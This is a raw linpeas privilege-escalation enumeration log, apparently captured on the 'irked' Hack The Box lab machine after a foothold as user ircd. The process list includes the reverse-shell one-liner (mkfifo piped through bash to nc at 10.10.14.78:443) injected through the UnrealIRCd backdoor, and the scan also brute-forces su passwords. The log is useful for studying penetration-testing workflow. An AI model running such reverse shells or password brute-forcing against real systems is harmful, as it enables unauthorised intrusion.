@@ -1,0 +1,1048 @@
+ircd@irked /tmp $ ./linpeas.sh -a
+
+                         
+                         
+                         
+                         
+                         
+                         
+                         
+                         
+                         
+                         
+                         
+                         
+                         
+  linpeas v2.3.7 by carlospolop
+
+ADVISORY: linpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 99% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMangeta: Your username
+
+
+====================================( Basic information )=====================================
+OS: Linux version 3.16.0-6-686-pae (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08)
+User & Groups: uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
+Hostname: irked
+Writable folder: /dev/shm
+[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+[+] nmap is available for network discover & port scanning, you should use it yourself
+
+
+====================================( System Information )====================================
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 3.16.0-6-686-pae (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08)
+Distributor ID:	Debian
+Description:	Debian GNU/Linux 8.10 (jessie)
+Release:	8.10
+Codename:	jessie
+
+[+] Sudo version
+sudo Not Found
+
+[+] PATH
+[i] Any writable folder in original PATH? (a new completed path will be exported)
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+New path exported: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin
+
+[+] Date
+Sun Sep  6 05:15:04 EDT 2020
+
+[+] System stats
+Filesystem      Size  Used Avail Use% Mounted on
+/dev/sda1        19G  4.5G   14G  26% /
+udev             10M     0   10M   0% /dev
+tmpfs           405M  6.0M  399M   2% /run
+tmpfs          1012M   84K 1012M   1% /dev/shm
+tmpfs           5.0M  4.0K  5.0M   1% /run/lock
+tmpfs          1012M     0 1012M   0% /sys/fs/cgroup
+tmpfs           203M     0  203M   0% /run/user/1001
+tmpfs           203M   12K  203M   1% /run/user/118
+             total       used       free     shared    buffers     cached
+Mem:       2071856    1004472    1067384       6516      61560     553660
+-/+ buffers/cache:     389252    1682604
+Swap:       901116          0     901116
+
+[+] Environment
+[i] Any private information inside environment variables?
+HISTFILESIZE=0
+MAIL=/var/mail/ircd
+USER=ircd
+SHLVL=2
+HOME=/home/ircd
+PS1=\[\033[01;32m\]\u@\h\[\033[01;34m\] \w \$\[\033[00m\] 
+LOGNAME=ircd
+_=./linpeas.sh
+XDG_SESSION_ID=c1
+TERM=xterm
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin
+XDG_RUNTIME_DIR=/run/user/1001
+LANG=en_US.UTF-8
+HISTSIZE=0
+SHELL=bash
+HISTFILE=/dev/null
+LS_OPTIONS=--color=auto
+
+[+] Looking for Signature verification failed in dmseg
+ Not Found
+
+[+] selinux enabled? .............. sestatus Not Found
+[+] Printer? ...................... lpstat Not Found
+[+] Is this a container? .......... No
+[+] Is ASLR enabled? .............. Yes
+
+=========================================( Devices )==========================================
+[+] Any sd* disk in /dev? (limit 20)
+sda
+sda1
+sda2
+sda5
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+UUID=85e17c08-fee3-451a-a1f8-c95346ddc46c /               ext4    errors=remount-ro 0       1
+UUID=29d1ae3e-562d-4323-b58c-2d48799f9632 none            swap    sw              0       0
+/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
+
+
+====================================( Available Software )====================================
+[+] Useful software
+/usr/bin/nmap
+/bin/nc
+/usr/bin/ncat
+/bin/netcat
+/bin/nc.traditional
+/usr/bin/wget
+/bin/ping
+/usr/bin/gcc
+/usr/bin/g++
+/usr/bin/make
+/usr/bin/base64
+/usr/bin/python
+/usr/bin/python2
+/usr/bin/python3
+/usr/bin/python2.7
+/usr/bin/perl
+/usr/bin/xterm
+
+[+] Compilers Installed
+ii  g++                                   4:4.9.2-2                                  i386         GNU C++ compiler
+ii  g++-4.9                               4.9.2-10+deb8u1                            i386         GNU C++ compiler
+ii  gcc                                   4:4.9.2-2                                  i386         GNU C compiler
+ii  gcc-4.9                               4.9.2-10+deb8u1                            i386         GNU C compiler
+/usr/bin/gcc
+/usr/bin/g++
+
+
+================================( Processes, Cron & Services )================================
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.2  22940  4240 ?        Ss   03:40   0:01 /sbin/init
+root       140  0.0  0.1   9376  4068 ?        Ss   03:40   0:00 /lib/systemd/systemd-journald
+root       155  0.0  0.1  12824  3576 ?        Ss   03:40   0:00 /lib/systemd/systemd-udevd
+root       460  0.0  0.1   4444  2700 ?        Ss   03:40   0:00 /sbin/rpcbind -w
+statd      469  0.0  0.1   4628  2904 ?        Ss   03:40   0:00 /sbin/rpc.statd
+root       484  0.0  0.0   2924   172 ?        Ss   03:40   0:00 /usr/sbin/rpc.idmapd
+root       486  0.0  0.2  36500  5768 ?        Ssl  03:40   0:00 /usr/lib/accountsservice/accounts-daemon
+root       488  0.0  0.5  55520 12096 ?        Ssl  03:40   0:00 /usr/sbin/NetworkManager --no-daemon
+root       489  0.0  0.3  45436  6748 ?        Ssl  03:40   0:04 /usr/bin/vmtoolsd
+root       490  0.0  0.1  31100  3248 ?        Ssl  03:40   0:00 /usr/sbin/rsyslogd -n
+root       491  0.0  0.3  40052  7468 ?        Ssl  03:40   0:00 /usr/sbin/ModemManager
+daemon     493  0.0  0.0   2652  1716 ?        Ss   03:40   0:00 /usr/sbin/atd -f
+root       496  0.0  0.1   5016  2636 ?        Ss   03:40   0:00 /usr/sbin/cron -f
+avahi      499  0.0  0.0   3564   220 ?        S    03:40   0:00 avahi-daemon: chroot helper
+message+   510  0.0  0.1   5704  3680 ?        Ss   03:40   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+root       527  0.0  0.1   3768  2804 ?        Ss   03:40   0:00 /lib/systemd/systemd-logind
+root       552  0.0  0.2  10024  4572 ?        Ss   03:40   0:00 /usr/sbin/cups-browsed
+root       559  0.0  0.0   2200  1544 ?        Ss   03:40   0:00 /usr/sbin/acpid
+root       569  0.0  0.2   8112  4816 ?        Ss   03:40   0:00 /usr/sbin/sshd -D
+ircd       616  0.0  0.1   4856  3568 ?        Ss   03:40   0:00 /lib/systemd/systemd --user
+root       618  0.0  0.3  36344  6952 ?        Ssl  03:40   0:00 /usr/lib/policykit-1/polkitd --no-debug
+ircd       622  0.0  0.0   6408  1320 ?        S    03:40   0:00 (sd-pam)  
+root       657  0.0  0.3  46748  7132 ?        Ssl  03:40   0:00 /usr/sbin/gdm3
+root       688  0.0  1.0  69560 21692 tty7     Ss+  03:40   0:00 /usr/bin/Xorg :0 -novtswitch -background none -noreset -verbose 3 -auth /var/run/gdm3/auth-for-Debian-gdm-r5Q8RV/database -seat seat0 -nolisten tcp vt7
+ircd       696  0.0  0.1   4852  3764 ?        S    03:40   0:03 /home/ircd/Unreal3.2/src/ircd
+root       738  0.0  0.2   6476  4860 ?        Ss   03:40   0:00 /usr/sbin/apache2 -k start
+root       912  0.0  0.0   2048    56 ?        Ss   03:40   0:00 /usr/sbin/minissdpd -i 0.0.0.0
+Debian-+   929  0.0  0.1   9932  3092 ?        Ss   03:40   0:00 /usr/sbin/exim4 -bd -q30m
+Debian-+   932  0.0  0.1   4856  3584 ?        Ss   03:40   0:00 /lib/systemd/systemd --user
+Debian-+   933  0.0  0.0   6408  1324 ?        S    03:40   0:00 (sd-pam)  
+Debian-+   935  0.0  0.5  71520 10496 ?        Ssl  03:40   0:00 /usr/bin/gnome-session --autostart /usr/share/gdm/greeter/autostart
+Debian-+   938  0.0  0.0   3980  1864 ?        S    03:40   0:00 /usr/bin/dbus-launch --exit-with-session /usr/bin/gnome-session --autostart /usr/share/gdm/greeter/autostart
+Debian-+   939  0.0  0.1   5360  2636 ?        Ss   03:40   0:00 /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --session
+Debian-+   942  0.0  0.2  43284  5556 ?        Sl   03:40   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher
+Debian-+   946  0.0  0.1   5252  3268 ?        S    03:40   0:00 /usr/bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
+Debian-+   949  0.0  0.2  18260  4852 ?        Sl   03:40   0:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
+Debian-+   956  0.0  1.1 173948 24276 ?        Sl   03:40   0:00 /usr/lib/gnome-settings-daemon/gnome-settings-daemon
+root       963  0.0  0.3  41644  7912 ?        Ssl  03:40   0:00 /usr/lib/upower/upowerd
+colord     976  0.0  0.5  42132 11188 ?        Ssl  03:40   0:00 /usr/lib/colord/colord
+Debian-+   985  0.0  0.3  89140  6384 ?        S<l  03:40   0:00 /usr/bin/pulseaudio --start --log-target=syslog
+rtkit      987  0.0  0.1  21396  2212 ?        SNsl 03:40   0:00 /usr/lib/rtkit/rtkit-daemon
+root      1000  0.0  0.0   4180  1864 tty1     Ss+  03:40   0:00 /sbin/agetty --noclear tty1 linux
+Debian-+  1013  0.0  0.2  25008  4276 ?        Sl   03:40   0:00 /usr/lib/dconf/dconf-service
+root      1023  0.0  0.1   7664  4100 ?        Ss   03:40   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
+root      1025  0.0  0.4  51188  9676 ?        Ssl  03:40   0:00 /usr/lib/packagekit/packagekitd
+Debian-+  1055  0.0  0.9  32136 20144 ?        S    03:40   0:00 /usr/lib/gnome-session/gnome-session-failed --extensions
+www-data  1253  0.0  0.1   6500  3784 ?        S    03:45   0:00 /usr/sbin/apache2 -k start
+www-data  1255  2.7  0.1 231020  3492 ?        Sl   03:45   2:24 /usr/sbin/apache2 -k start
+root      1261  0.0  0.2  11900  6048 ?        Ss   03:45   0:00 /usr/sbin/cupsd -f
+www-data  1467  4.1  0.1 231020  3668 ?        Sl   04:18   2:20 /usr/sbin/apache2 -k start
+www-data  1780  2.9  0.1 231020  3492 ?        Sl   04:21   1:34 /usr/sbin/apache2 -k start
+ircd      2396  0.0  0.0   2276   616 ?        S    05:09   0:00 sh -c AB;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.78 443 >/tmp/f v:60.0) Gecko/20100101 Firefox/60.0? Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8? Accept-Language: en-US,en;q=0.5? Accept-Encoding: gzip, deflate? Connection: keep-alive? Upgrade-Insecure-Requests: 1? ? 
+ircd      2399  0.0  0.0   3908   620 ?        S    05:09   0:00 cat /tmp/f
+ircd      2400  0.0  0.1   5440  3516 ?        S    05:09   0:00 /bin/bash -i
+ircd      2401  0.0  0.0   2228  1488 ?        S    05:09   0:00 nc 10.10.14.78 443
+ircd      2403  0.0  0.2   9820  5880 ?        S    05:10   0:00 python -c import pty; pty.spawn("/bin/bash")
+ircd      2404  0.0  0.1   5472  3452 pts/0    Ss   05:10   0:00 /bin/bash
+ircd      2444  1.0  0.0   2404  1576 pts/0    S+   05:15   0:00 /bin/sh ./linpeas.sh -a
+root      2506  0.0  0.0  12824  1880 ?        S    05:15   0:00 /lib/systemd/systemd-udevd
+ircd      2628  0.0  0.1   4776  2448 pts/0    R+   05:15   0:00 ps aux
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+-rwxr-xr-x 1 root root 1105840 Nov  5  2016 /bin/bash
+lrwxrwxrwx 1 root root       4 Nov  8  2014 /bin/sh -> dash
+-rwxr-xr-x 1 ircd ircd 1454200 May 14  2018 /home/ircd/Unreal3.2/src/ircd
+-rwxr-xr-x 1 root root 1316528 Apr  8  2017 /lib/systemd/systemd
+-rwxr-xr-x 1 root root  263704 Apr  8  2017 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root root  538136 Apr  8  2017 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root root  300612 Apr  8  2017 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root root   34540 Mar 29  2015 /sbin/agetty
+lrwxrwxrwx 1 root root      20 Apr  8  2017 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root root   46912 May  4  2017 /sbin/rpcbind
+-rwxr-xr-x 1 root root   76408 Aug 13  2014 /sbin/rpc.statd
+-rwxr-xr-x 1 root root 2338296 Oct 14  2017 /sbin/wpa_supplicant
+-rwxr-xr-x 1 root root  518888 Nov 21  2016 /usr/bin/dbus-daemon
+-rwxr-xr-x 1 root root   22204 Nov 21  2016 /usr/bin/dbus-launch
+-rwxr-xr-x 1 root root  224372 Oct  1  2014 /usr/bin/gnome-session
+-rwxr-xr-x 1 root root   83348 Oct 12  2014 /usr/bin/pulseaudio
+-rwxr-xr-x 1 root root   47208 Feb 13  2015 /usr/bin/vmtoolsd
+-rwxr-xr-x 1 root root 2564976 Oct 16  2017 /usr/bin/Xorg
+-rwxr-xr-x 1 root root  150348 Oct  1  2014 /usr/lib/accountsservice/accounts-daemon
+-rwxr-xr-x 1 root root   94796 Oct  9  2014 /usr/lib/at-spi2-core/at-spi2-registryd
+-rwxr-xr-x 1 root root   17820 Oct  9  2014 /usr/lib/at-spi2-core/at-spi-bus-launcher
+-rwxr-xr-x 1 root root  271740 Dec  9  2014 /usr/lib/colord/colord
+-rwxr-xr-x 1 root root   80176 Sep 22  2014 /usr/lib/dconf/dconf-service
+-rwxr-xr-x 1 root root   13904 Oct  1  2014 /usr/lib/gnome-session/gnome-session-failed
+-rwxr-xr-x 1 root root   34776 Feb 25  2017 /usr/lib/gnome-settings-daemon/gnome-settings-daemon
+-rwxr-xr-x 1 root root  308712 Dec  8  2014 /usr/lib/packagekit/packagekitd
+-rwxr-xr-x 1 root root    9876 Sep  8  2016 /usr/lib/policykit-1/polkitd
+-rwxr-xr-x 1 root root   59316 Nov 16  2014 /usr/lib/rtkit/rtkit-daemon
+-rwxr-xr-x 1 root root  161076 Apr  6  2015 /usr/lib/upower/upowerd
+-rwxr-xr-x 1 root root   50924 Nov  8  2014 /usr/sbin/acpid
+-rwxr-xr-x 1 root root  642948 Mar 31  2018 /usr/sbin/apache2
+-rwxr-xr-x 1 root root   21772 Sep 30  2014 /usr/sbin/atd
+-rwxr-xr-x 1 root root   43012 Jun  7  2015 /usr/sbin/cron
+-rwxr-xr-x 1 root root   55168 Dec 15  2015 /usr/sbin/cups-browsed
+-rwxr-xr-x 1 root root  497516 Jul 23  2017 /usr/sbin/cupsd
+-rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4
+-rwxr-xr-x 1 root root  433812 Apr  4  2015 /usr/sbin/gdm3
+-rwxr-xr-x 1 root root   29956 Nov  5  2016 /usr/sbin/minissdpd
+-rwxr-xr-x 1 root root 1207996 Sep 17  2014 /usr/sbin/ModemManager
+-rwxr-xr-x 1 root root 1282568 Mar 31  2015 /usr/sbin/NetworkManager
+-rwxr-xr-x 1 root root   31012 Aug 13  2014 /usr/sbin/rpc.idmapd
+-rwxr-xr-x 1 root root  653088 Dec 20  2015 /usr/sbin/rsyslogd
+-rwxr-xr-x 1 root root  953240 Nov 19  2017 /usr/sbin/sshd
+
+[+] Different processes executed during 1 min (interesting is low number of repetitions)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+-rw-r--r-- 1 root root  722 Jun  7  2015 /etc/crontab
+
+/etc/cron.d:
+total 24
+drwxr-xr-x   2 root root  4096 May 11  2018 .
+drwxr-xr-x 135 root root 12288 Oct 30  2018 ..
+-rw-r--r--   1 root root   244 Dec 28  2014 anacron
+-rw-r--r--   1 root root   102 Jun  7  2015 .placeholder
+
+/etc/cron.daily:
+total 84
+drwxr-xr-x   2 root root  4096 May 11  2018 .
+drwxr-xr-x 135 root root 12288 Oct 30  2018 ..
+-rwxr-xr-x   1 root root   311 Dec 28  2014 0anacron
+-rwxr-xr-x   1 root root   625 Mar 31  2018 apache2
+-rwxr-xr-x   1 root root 15000 Dec 11  2016 apt
+-rwxr-xr-x   1 root root   314 Nov  8  2014 aptitude
+-rwxr-xr-x   1 root root   355 Oct 17  2014 bsdmainutils
+-rwxr-xr-x   1 root root   384 Oct  5  2014 cracklib-runtime
+-rwxr-xr-x   1 root root  1597 May  2  2016 dpkg
+-rwxr-xr-x   1 root root  4125 Feb 10  2018 exim4-base
+-rwxr-xr-x   1 root root    89 Nov  8  2014 logrotate
+-rwxr-xr-x   1 root root  1293 Dec 31  2014 man-db
+-rwxr-xr-x   1 root root   435 Jun 13  2013 mlocate
+-rwxr-xr-x   1 root root   249 Nov 19  2015 passwd
+-rw-r--r--   1 root root   102 Jun  7  2015 .placeholder
+
+/etc/cron.hourly:
+total 20
+drwxr-xr-x   2 root root  4096 May 11  2018 .
+drwxr-xr-x 135 root root 12288 Oct 30  2018 ..
+-rw-r--r--   1 root root   102 Jun  7  2015 .placeholder
+
+/etc/cron.monthly:
+total 24
+drwxr-xr-x   2 root root  4096 May 11  2018 .
+drwxr-xr-x 135 root root 12288 Oct 30  2018 ..
+-rwxr-xr-x   1 root root   313 Dec 28  2014 0anacron
+-rw-r--r--   1 root root   102 Jun  7  2015 .placeholder
+
+/etc/cron.weekly:
+total 28
+drwxr-xr-x   2 root root  4096 May 11  2018 .
+drwxr-xr-x 135 root root 12288 Oct 30  2018 ..
+-rwxr-xr-x   1 root root   312 Dec 28  2014 0anacron
+-rwxr-xr-x   1 root root   771 Dec 31  2014 man-db
+-rw-r--r--   1 root root   102 Jun  7  2015 .placeholder
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+HOME=/root
+LOGNAME=root
+
+1	5	cron.daily	run-parts --report /etc/cron.daily
+7	10	cron.weekly	run-parts --report /etc/cron.weekly
+@monthly	15	cron.monthly	run-parts --report /etc/cron.monthly
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+
+[+] Services
+[i] Search for outdated versions
+ [ + ]  acpid
+ [ + ]  alsa-utils
+ [ - ]  anacron
+ [ + ]  apache2
+ [ + ]  atd
+ [ + ]  avahi-daemon
+ [ - ]  bluetooth
+ [ - ]  bootlogs
+ [ - ]  bootmisc.sh
+ [ - ]  checkfs.sh
+ [ - ]  checkroot-bootclean.sh
+ [ - ]  checkroot.sh
+ [ + ]  console-setup
+ [ + ]  cron
+ [ + ]  cups
+ [ + ]  cups-browsed
+ [ + ]  dbus
+ [ + ]  exim4
+ [ + ]  gdm3
+ [ + ]  gdomap
+ [ - ]  hostname.sh
+ [ - ]  hwclock.sh
+ [ + ]  kbd
+ [ + ]  keyboard-setup
+ [ - ]  killprocs
+ [ + ]  kmod
+ [ + ]  minissdpd
+ [ - ]  motd
+ [ - ]  mountall-bootclean.sh
+ [ - ]  mountall.sh
+ [ - ]  mountdevsubfs.sh
+ [ - ]  mountkernfs.sh
+ [ - ]  mountnfs-bootclean.sh
+ [ - ]  mountnfs.sh
+ [ + ]  network-manager
+ [ + ]  networking
+ [ + ]  nfs-common
+ [ + ]  open-vm-tools
+ [ - ]  pppd-dns
+ [ + ]  procps
+ [ + ]  rc.local
+ [ - ]  rmnologin
+ [ + ]  rpcbind
+ [ + ]  rsyslog
+ [ - ]  saned
+ [ - ]  sendsigs
+ [ + ]  speech-dispatcher
+ [ + ]  ssh
+ [ + ]  udev
+ [ + ]  udev-finish
+ [ - ]  umountfs
+ [ - ]  umountnfs.sh
+ [ - ]  umountroot
+ [ + ]  urandom
+ [ - ]  x11-common
+
+
+===================================( Network Information )====================================
+[+] Hostname, hosts and DNS
+irked
+127.0.0.1	localhost
+127.0.1.1	irked.irked.htb	irked
+
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+search mi.army.mil
+nameserver 10.10.10.2
+irked.htb
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Networks and neighbours
+default		0.0.0.0
+loopback	127.0.0.0
+link-local	169.254.0.0
+
+eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:cf:72  
+          inet addr:10.10.10.117  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: dead:beef::250:56ff:feb9:cf72/64 Scope:Global
+          inet6 addr: fe80::250:56ff:feb9:cf72/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2511349 errors:1354 dropped:2648 overruns:0 frame:0
+          TX packets:2406524 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:451799134 (430.8 MiB)  TX bytes:483992861 (461.5 MiB)
+          Interrupt:19 Base address:0x2000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:29 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:29 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:3221 (3.1 KiB)  TX bytes:3221 (3.1 KiB)
+
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         10.10.10.2      0.0.0.0         UG    0      0        0 eth0
+10.10.10.0      *               255.255.255.0   U     0      0        0 eth0
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:65534           0.0.0.0:*               LISTEN      696/ircd        
+tcp        0      0 0.0.0.0:8067            0.0.0.0:*               LISTEN      696/ircd        
+tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      696/ircd        
+tcp        0      0 0.0.0.0:51401           0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
+tcp        0    178 10.10.10.117:40200      10.10.14.78:443         ESTABLISHED 2401/nc         
+tcp        1      0 10.10.10.117:6697       10.10.14.78:44812       CLOSE_WAIT  696/ircd        
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
+tcp6       0      0 ::1:25                  :::*                    LISTEN      -               
+tcp6       0      0 :::47853                :::*                    LISTEN      -               
+tcp6       0      0 :::111                  :::*                    LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       1      0 ::1:51537               ::1:631                 CLOSE_WAIT  -               
+udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:631             0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:635             0.0.0.0:*                           -               
+udp        0      0 127.0.0.1:645           0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:56976           0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:41705           0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:1900            0.0.0.0:*                           -               
+udp6       0      0 :::111                  :::*                                -               
+udp6       0      0 :::635                  :::*                                -               
+udp6       0      0 :::5353                 :::*                                -               
+udp6       0      0 :::53027                :::*                                -               
+udp6       0      0 :::43966                :::*                                -               
+
+[+] Can I sniff with tcpdump?
+No
+
+
+====================================( Users Information )=====================================
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups
+uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
+
+[+] Do I have PGP keys?
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Testing 'sudo -l' without password & /etc/sudoers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+
+[+] Checking /etc/doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+
+[Configuration]
+AdminIdentities=unix-user:0
+[Configuration]
+AdminIdentities=unix-group:sudo
+
+[+] Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds
+  Bruteforcing user root...
+  Bruteforcing user speech-dispatcher...
+sh: echo: I/O error
+  Bruteforcing user djmardov...
+  Bruteforcing user ircd...
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+djmardov:x:1000:1000:djmardov,,,:/home/djmardov:/bin/bash
+ircd:x:1001:1001::/home/ircd:/bin/sh
+root:x:0:0:root:/root:/bin/bash
+speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
+uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
+uid=100(systemd-timesync) gid=103(systemd-timesync) groups=103(systemd-timesync)
+uid=101(systemd-network) gid=104(systemd-network) groups=104(systemd-network)
+uid=102(systemd-resolve) gid=105(systemd-resolve) groups=105(systemd-resolve)
+uid=103(systemd-bus-proxy) gid=106(systemd-bus-proxy) groups=106(systemd-bus-proxy)
+uid=104(messagebus) gid=111(messagebus) groups=111(messagebus)
+uid=105(avahi) gid=112(avahi) groups=112(avahi)
+uid=106(Debian-exim) gid=114(Debian-exim) groups=114(Debian-exim)
+uid=107(statd) gid=65534(nogroup) groups=65534(nogroup)
+uid=108(colord) gid=118(colord) groups=118(colord)
+uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=110(geoclue) gid=119(geoclue) groups=119(geoclue)
+uid=111(pulse) gid=121(pulse) groups=121(pulse),29(audio)
+uid=112(speech-dispatcher) gid=29(audio) groups=29(audio)
+uid=113(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=114(rtkit) gid=123(rtkit) groups=123(rtkit)
+uid=115(saned) gid=124(saned) groups=124(saned),113(scanner)
+uid=116(usbmux) gid=46(plugdev) groups=46(plugdev)
+uid=117(hplip) gid=7(lp) groups=7(lp)
+uid=118(Debian-gdm) gid=125(Debian-gdm) groups=125(Debian-gdm)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
